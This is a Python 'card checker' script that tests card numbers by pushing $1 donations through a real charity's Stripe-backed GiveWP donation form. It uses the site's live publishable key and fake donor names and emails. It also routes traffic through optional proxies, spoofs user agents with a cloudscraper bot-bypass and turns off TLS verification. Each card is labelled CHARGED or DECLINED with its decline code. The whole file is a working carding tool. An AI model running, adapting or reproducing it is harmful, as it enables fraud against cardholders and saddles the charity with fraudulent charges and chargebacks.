import cloudscraper
import re
import json
import requests
import time
import uuid
import string
import random
import asyncio
from datetime import datetime
from fake_useragent import UserAgent
import ssl
import urllib3
from typing import Dict, Any

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Fix for Python 3.13 SSL issue
try:
    _create_unverified_https_context = ssl._create_unverified_context
except AttributeError:
    pass
else:
    ssl._create_default_https_context = _create_unverified_https_context


def find_between(s, start, end):
    try:
        if start in s and end in s:
            return (s.split(start))[1].split(end)[0]
        return ""
    except:
        return ""


def create_custom_session():
    """Create a custom session with proper SSL settings for Python 3.13"""
    session = requests.Session()

    class CustomHTTPAdapter(requests.adapters.HTTPAdapter):
        def init_poolmanager(self, *args, **kwargs):
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            kwargs['ssl_context'] = context
            return super().init_poolmanager(*args, **kwargs)

        def proxy_manager_for(self, *args, **kwargs):
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            kwargs['ssl_context'] = context
            return super().proxy_manager_for(*args, **kwargs)

    adapter = CustomHTTPAdapter()
    session.mount('https://', adapter)
    session.mount('http://', adapter)
    return session


def create_cloudscraper_session():
    """Create cloudscraper session with proper settings"""
    scraper = cloudscraper.create_scraper(
        browser={
            'browser': 'chrome',
            'platform': 'windows',
            'desktop': True,
            'mobile': False
        },
        delay=15
    )
    scraper.verify = False

    class CloudScraperAdapter(requests.adapters.HTTPAdapter):
        def init_poolmanager(self, *args, **kwargs):
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            kwargs['ssl_context'] = context
            return super().init_poolmanager(*args, **kwargs)

    scraper.mount('https://', CloudScraperAdapter())
    return scraper


def check_donation_card_sync(card: Dict[str, str], proxy: str = None) -> Dict[str, Any]:
    """
    Synchronous card check using the exact logic, headers, parameters, and flow of 1$.py.
    """
    start_time = time.perf_counter()
    n = card["cc"]
    m = card["month"]
    y = card["year"]
    c = card["cvv"]

    if len(y) == 2:
        y = "20" + y

    result = {
        "card": f"{n}|{m}|{y[-2:]}|{c}",
        "status": "ERROR",
        "response": "Check failed",
        "decline_code": "",
        "time": 0.0
    }

    # Setup proxies if provided
    proxies_dict = None
    if proxy:
        formatted_proxy = proxy
        if not proxy.startswith("http://") and not proxy.startswith("https://"):
            formatted_proxy = f"http://{proxy}"
        proxies_dict = {
            "http": formatted_proxy,
            "https": formatted_proxy
        }

    # Approaches (exact mapping of 1$.py, optimized for speed)
    approaches = [
        {
            'name': 'Custom requests session',
            'func': lambda: create_custom_session()
        },
        {
            'name': 'Cloudscraper with custom settings',
            'func': lambda: create_cloudscraper_session()
        },
        {
            'name': 'Simple requests session',
            'func': lambda: requests.Session()
        }
    ]

    # Generate random user data (exact mapping of 1$.py)
    ua = UserAgent()
    user_agent_val = ua.random or "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"

    name = 'outcome'
    domain = 'gmail.com'
    number = random.randint(10000, 99999)
    suffix = ''.join(random.choices(string.ascii_lowercase, k=3))
    email = f"{name}{number}{suffix}@{domain}"

    first_names = ['john', 'mike', 'david', 'chris', 'james', 'robert', 'willam', 'thomas', 'daniel', 'paul']
    last_names = ['smith', 'johnson', 'williams', 'brown', 'jones', 'garcia', 'miller', 'davis', 'rodriguez', 'martinez']
    g_first = random.choice(first_names)
    g_last = random.choice(last_names)
    card_n = f"{g_first} {g_last}"

    # Headers for first request (exact mapping of 1$.py)
    headers1 = {
        'accept': 'application/json',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'referer': 'https://js.stripe.com/',
        'user-agent': user_agent_val,
    }

    data1 = {
        'type': 'card',
        'billing_details[name]': card_n,
        'billing_details[email]': email,
        'card[number]': n,
        'card[cvc]': c,
        'card[exp_month]': m,
        'card[exp_year]': y,
        'guid': str(uuid.uuid4()),
        'muid': str(uuid.uuid4()),
        'sid': str(uuid.uuid4()),
        'payment_user_agent': 'stripe.js/157d4ab676; stripe-js-v3/157d4ab676; split-card-element',
        'referrer': 'https://www.forechrist.com',
        'time_on_page': str(random.randint(100000, 300000)),
        'key': 'pk_live_51OvrJGRxAfihbegmoT7FwLu2sYpSqHUKvQpNDKyhgVkpNtkoU4bypkWfTsk5A3JLg7o7X1Fsrfwisy2cGnMDd5Lc00qvS6YatH',
        '_stripe_account': 'acct_1OvrJGRxAfihbegm'
    }

    pm_id = None
    last_error = None
    current_session = None

    for approach in approaches:
        try:
            session = approach['func']()
            if proxies_dict:
                session.proxies = proxies_dict

            response1 = session.post(
                'https://api.stripe.com/v1/payment_methods',
                headers=headers1,
                data=data1,
                timeout=30,
                verify=False
            )

            if response1.status_code == 200:
                res1_json = response1.json()
                if 'error' not in res1_json:
                    pm_id = res1_json.get('id')
                    current_session = session
                    break
                else:
                    err_msg = res1_json['error'].get('message', '')
                    dec_code = res1_json['error'].get('decline_code', '')
                    result["status"] = "DECLINED"
                    result["response"] = err_msg
                    result["decline_code"] = dec_code
                    result["time"] = round(time.perf_counter() - start_time, 2)
                    return result
            else:
                try:
                    res1_json = response1.json()
                    if 'error' in res1_json:
                        err_msg = res1_json['error'].get('message', '')
                        dec_code = res1_json['error'].get('decline_code', '')
                        result["status"] = "DECLINED"
                        result["response"] = err_msg
                        result["decline_code"] = dec_code
                        result["time"] = round(time.perf_counter() - start_time, 2)
                        return result
                except:
                    pass
                last_error = f"Status code: {response1.status_code}"
        except Exception as e:
            last_error = str(e)
            continue

    if not pm_id:
        result["status"] = "ERROR"
        result["response"] = f"Payment method failed: {last_error}"
        result["time"] = round(time.perf_counter() - start_time, 2)
        return result

    # Second request - Get form hash (exact mapping of 1$.py)
    headers2 = {
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://www.forechrist.com',
        'referer': 'https://www.forechrist.com/donations/dress-a-student-second-round-of-donations-2/',
        'user-agent': user_agent_val,
        'x-requested-with': 'XMLHttpRequest',
    }

    data2 = {
        'action': 'give_donation_form_reset_all_nonce',
        'give_form_id': '31358',
    }

    form_hash = None
    try:
        response2 = current_session.post(
            'https://www.forechrist.com/wp-admin/admin-ajax.php',
            headers=headers2,
            data=data2,
            timeout=30,
            verify=False
        )

        if response2.status_code == 200:
            res2_json = response2.json()
            if res2_json.get('success'):
                form_hash = res2_json['data'].get('give_form_hash')
    except Exception as e:
        last_error = f"Form hash error: {str(e)}"

    if not form_hash:
        result["status"] = "ERROR"
        result["response"] = f"Form hash failed: {last_error}"
        result["time"] = round(time.perf_counter() - start_time, 2)
        return result

    # Small delay before final request
    time.sleep(3)

    # Final request - Process donation (exact mapping of 1$.py)
    final_url = "https://www.forechrist.com/donations/dress-a-student-second-round-of-donations-2/?payment-mode=stripe&form-id=31358"

    data3 = {
        'give-fee-amount': '0.34',
        'give-fee-mode-enable': 'false',
        'give-fee-status': 'enabled',
        'give-honeypot': '',
        'give-form-id-prefix': '31358-1',
        'give-form-id': '31358',
        'give-form-title': 'Dress a Student – Second Round of Donations',
        'give-current-url': 'https://www.forechrist.com/donations/dress-a-student-second-round-of-donations-2/',
        'give-form-url': 'https://www.forechrist.com/donations/dress-a-student-second-round-of-donations-2/',
        'give-form-minimum': '1',
        'give-form-maximum': '1000000',
        'give-form-hash': form_hash,
        'give-price-id': '0',
        'give-recurring-logged-in-only': '',
        'give-logged-in-only': '1',
        '_give_is_donation_recurring': '0',
        'give_recurring_donation_details': '{"give_recurring_option":"yes_donor"}',
        'give-amount': '1',
        'give_stripe_payment_method': pm_id,
        'give-fee-recovery-settings': '{"fee_data":{"stripe":{"percentage":"2.900000","base_amount":"0.300000","give_fee_disable":false,"give_fee_status":true,"is_break_down":true,"maxAmount":"0"},"stripe_google_pay":{"percentage":"2.900000","base_amount":"0.300000","give_fee_disable":false,"give_fee_status":true,"is_break_down":true,"maxAmount":"0"},"paypal-commerce":{"percentage":"2.890000","base_amount":"0.490000","give_fee_disable":false,"give_fee_status":true,"is_break_down":true,"maxAmount":"0"},"stripe_payment_element":{"percentage":"2.900000","base_amount":"0.300000","give_fee_disable":false,"give_fee_status":true,"is_break_down":true,"maxAmount":"0"}},"give_fee_status":true,"give_fee_disable":false,"is_break_down":true,"fee_mode":"donor_opt_in","is_fee_mode":true,"fee_recovery":true}',
        'payment-mode': 'stripe',
        'give_first': g_first,
        'give_last': g_last,
        'give_email': email,
        'give_comment': '',
        'card_name': card_n,
        'give_action': 'purchase',
        'give-gateway': 'stripe',
    }

    try:
        response3 = current_session.post(
            final_url,
            data=data3,
            allow_redirects=True,
            verify=False,
            timeout=30
        )

        response_text = response3.text.lower()
        result["time"] = round(time.perf_counter() - start_time, 2)

        # Check response for different outcomes (exact mapping of 1$.py)
        if "payment complete: thank you for your donation" in response_text:
            result["status"] = "CHARGED"
            result["response"] = "Payment complete: thank you for your donation"
        elif "your card has insufficient funds" in response_text:
            result["status"] = "DECLINED"
            result["response"] = "Insufficient Funds"
            result["decline_code"] = "insufficient_funds"
        elif "your card was declined" in response_text:
            result["status"] = "DECLINED"
            result["response"] = "Card Declined"
            result["decline_code"] = "card_declined"
        elif "do not honor" in response_text:
            result["status"] = "DECLINED"
            result["response"] = "Do Not Honor"
            result["decline_code"] = "do_not_honor"
        elif "incorrect cvc" in response_text or "incorrect security code" in response_text:
            result["status"] = "DECLINED"
            result["response"] = "Incorrect CVV"
            result["decline_code"] = "incorrect_cvc"
        elif "expired card" in response_text:
            result["status"] = "DECLINED"
            result["response"] = "Expired Card"
            result["decline_code"] = "expired_card"
        elif "thank you" in response_text and "donation" in response_text:
            result["status"] = "CHARGED"
            result["response"] = "Payment complete: thank you for your donation"
        else:
            result["status"] = "DECLINED"
            # Try to extract give error
            error_match = re.search(r'class="[^"]*give-error[^"]*"[^>]*>(.*?)</div>', response_text)
            if not error_match:
                error_match = re.search(r'class="[^"]*give-error[^"]*"[^>]*>(.*?)</p>', response_text)
            
            if error_match:
                extracted_err = error_match.group(1).strip()
                # strip html tags if any
                extracted_err = re.sub(r'<[^>]+>', '', extracted_err)
                result["response"] = extracted_err if extracted_err else "Card Declined"
            else:
                result["response"] = "Card Declined"
            result["decline_code"] = "card_declined"

    except Exception as e:
        result["status"] = "ERROR"
        result["response"] = f"Final request error: {str(e)}"
        result["time"] = round(time.perf_counter() - start_time, 2)

    return result


async def check_donation_card(card: Dict[str, str], proxy: str = None) -> Dict[str, Any]:
    """Async wrapper for check_donation_card_sync"""
    return await asyncio.to_thread(check_donation_card_sync, card, proxy)


def Tele(cc):
    """Compatible interface from 1$.py"""
    try:
        n, m, y, c = cc.split("|")
        card = {"cc": n, "month": m, "year": y, "cvv": c}
        res = check_donation_card_sync(card)
        if res["status"] == "CHARGED":
            return "APPROVED"
        return res["response"]
    except Exception as e:
        return f"Error: {str(e)}"


def main():
    print("Stripe Credit Card Checker")
    print("-" * 50)
    cc_number = input("Enter CC Details (CC|MM|YY|CVV): ").strip()
    result = Tele(cc_number)
    print(f"\nFinal Result: {result}")


if __name__ == "__main__":
    main()